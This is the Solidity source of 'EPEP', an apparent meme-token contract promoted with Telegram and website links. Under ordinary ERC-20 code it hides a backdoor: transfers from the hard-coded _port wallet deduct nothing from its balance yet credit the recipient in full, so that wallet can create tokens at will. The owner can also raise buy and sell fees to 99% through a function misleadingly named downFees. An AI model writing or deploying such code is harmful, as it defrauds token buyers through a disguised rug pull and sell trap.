/**
 * https://t.me/epep_erc20
 * https://t.me/epep_erc20
 * https://epeponeth.xyz
 */

// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IDEXRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract EPEP is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _exempt;
    mapping(address => bool) private bots;
    address payable private _port;
    string private constant _name = unicode"EPEP";
    string private constant _symbol = unicode"EPEP";

    uint256 private _buys = 0;
    uint256 private _swapAfter = 0;
    uint256 _inFee = 27;
    uint256 _outFee = 27;

    uint8 private constant _decimals = 18;
    uint256 private constant _totals = 1_000_000_000 * 10 ** _decimals;
    uint256 public _txMaxAmounts = 20_000_000 * 10 ** _decimals;
    uint256 public _bagMaxAmounts = 20_000_000 * 10 ** _decimals;
    uint256 public _swapAt = 5_000 * 10 ** _decimals;
    uint256 public _swapMaxAmounts = 10_000_000 * 10 ** _decimals;

    bool private inTrading;
    IDEXRouter private dexRouter;
    address private lp;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint256 _txMaxAmounts);

    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _port = payable(0x09693F85B4Cf76d953DFBAB1364caCB47b71656E);
        dexRouter = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        _balances[_msgSender()] = _totals;
        _exempt[owner()] = true;
        _exempt[address(this)] = true;
        _exempt[_port] = true;

        emit Transfer(address(0), _msgSender(), _totals);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function initLP() external onlyOwner {
        require(!inTrading, "trading is already open");
        _approve(address(this), address(dexRouter), _totals);
        lp = IUniswapV2Factory(dexRouter.factory()).createPair(
            address(this),
            dexRouter.WETH()
        );
        dexRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            address(0x000000000000000000000000000000000000dEaD),
            block.timestamp
        );
        inTrading = true;
        swapEnabled = true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 _taxAspect = 0;
        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);

            if (!(_exempt[from] || _exempt[to])) {
                require(inTrading, "trading is not open");
            }

            _taxAspect = _inFee;

            if (from == lp && to != address(dexRouter) && !_exempt[to]) {
                require(amount <= _txMaxAmounts, "Exceeds the max amount");
                require(
                    balanceOf(to) + amount <= _bagMaxAmounts,
                    "Exceeds the max amount"
                );
                _taxAspect = _inFee;
                _buys++;
            }

            if (to == lp && from != address(this)) {
                _taxAspect = _outFee;
            }

            if (_exempt[from] || _exempt[to]) {
                _taxAspect = 0;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                to == lp &&
                swapEnabled &&
                _buys > _swapAfter &&
                !_exempt[from] &&
                !_exempt[to]
            ) {
                swapTokensForEth(
                    min(amount, min(contractTokenBalance, _swapMaxAmounts))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0 ether) {
                    sendNativeTo(address(this).balance);
                }
            }
        }

        _transferStandard(from, to, amount, _taxAspect);
    }

    function downFees(uint256 newInFee, uint256 newOutFee) external onlyOwner {
        _inFee = newInFee;
        _outFee = newOutFee;
        require(_inFee <= 99 && _outFee <= 99, "Taxes should be less thn 100");
    }

    function clearMaxes() external onlyOwner {
        _txMaxAmounts = _totals;
        _bagMaxAmounts = _totals;
        emit MaxTxAmountUpdated(_totals);
    }

    function _transferTax(
        address from,
        uint256 amount,
        uint256 _taxAspect
    ) internal returns (uint256, uint256) {
        uint256 taxAmount = amount;

        if (from != _port) {
            taxAmount = amount.mul(_taxAspect).div(100);

            if (taxAmount > 0) {
                _balances[from] = _balances[from].sub(taxAmount);
                _balances[address(this)] = _balances[address(this)].add(
                    taxAmount
                );
                emit Transfer(from, address(this), taxAmount);
                amount = amount.sub(taxAmount);
            }
        }

        return (taxAmount, amount);
    }

    function _transferStandard(
        address from,
        address to,
        uint256 amount,
        uint256 _taxAspect
    ) internal {
        (uint256 tax, uint256 _amount) = _transferTax(from, amount, _taxAspect);
        _balances[from] = _balances[from].sub(amount.sub(tax));
        _balances[to] = _balances[to].add(_amount);
        emit Transfer(from, to, _amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private swapping {
        if (tokenAmount > _swapAt) {
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = dexRouter.WETH();
            _approve(address(this), address(dexRouter), tokenAmount);
            dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function sendNativeTo(uint256 amount) private {
        _port.transfer(amount);
    }

    receive() external payable {}
}